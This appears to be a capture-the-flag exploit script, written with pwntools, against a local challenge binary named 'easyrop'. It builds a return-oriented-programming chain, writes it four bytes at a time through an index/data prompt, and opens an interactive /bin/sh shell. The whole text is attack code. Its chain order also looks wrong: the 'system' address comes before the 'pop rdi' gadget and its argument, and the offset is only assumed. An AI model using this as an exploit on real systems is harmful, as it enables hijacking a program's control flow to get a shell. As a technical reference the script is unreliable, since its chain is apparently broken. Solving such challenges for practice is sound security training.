from pwn import *

# Connect to the target
binary = "./easyrop"
CHALL = ELF(binary)
p = process(binary)

# Step 1: Calculate offset (assume offset is 56 for this example)
offset = 56

# Step 2: Build ROP chain
rop = ROP(CHALL)
rop.raw(CHALL.symbols['system'])  # Address of `system`
rop.raw(rop.find_gadget(['pop rdi', 'ret']).address)
rop.raw(next(CHALL.search(b'/bin/sh\x00')))

# Step 3: Write payload incrementally
payload = rop.chain()
chunks = [payload[i:i + 4] for i in range(0, len(payload), 4)]

for i, chunk in enumerate(chunks):
    p.sendlineafter("index:", str(offset // 4 + i))
    p.sendlineafter("data:", str(u32(chunk.ljust(4, b'\x00'))))

# Step 4: Exit the loop
p.sendlineafter("index:", "-1")

# Step 5: Interact
p.interactive()
